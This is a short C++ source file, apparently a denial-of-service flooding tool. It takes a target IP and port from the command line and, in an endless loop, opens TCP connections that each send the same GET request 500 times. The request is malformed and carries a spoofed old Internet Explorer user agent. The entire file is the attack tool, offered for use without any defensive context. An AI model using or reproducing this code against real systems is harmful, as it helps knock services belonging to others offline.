#include <iostream>
#include <cstring>
#include <thread>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
using namespace std;

// Variables
int socketIter = 500;
const char *getReq = "GET / HTTP 1.1 Mozzila/4.0(compatible; MSIE 6.0; window NT 5.1; SV1) \r\n";
int threadCount = 50;

// Socket
int socketOps(const char *target,int port){
	// Creation
	struct sockaddr_in host;
	int s,conn,flow;
	inet_pton(AF_INET,target,&host.sin_addr);
	host.sin_family = AF_INET;
	host.sin_port = htons(port);
	s = socket(AF_INET, SOCK_STREAM, 0);
	if (s < 0){
		cout << "[!] Socket failed to be created \n Exiting... \n";
	};
	// Connection
	conn = (connect(s,(struct sockaddr *)&host,sizeof(host)));
	if(conn < 0) {
		cout << "[!] Connection failed\n";		
	};
	// Sending data
	cout << "[*] Sending requests \n";
	for(int i = 0; i<socketIter; i++){
		flow = send (s,getReq,strlen(getReq),0);
	};
	return 0;
};

// MAIN
int main(int argc, char *argv[]){
	// Threading
	while (true) {
		for (int i = 0; i<threadCount; i++){
			thread t(socketOps, argv[1],atoi(argv[2]));			
			t.join();
		};
	};
	return 0;
}
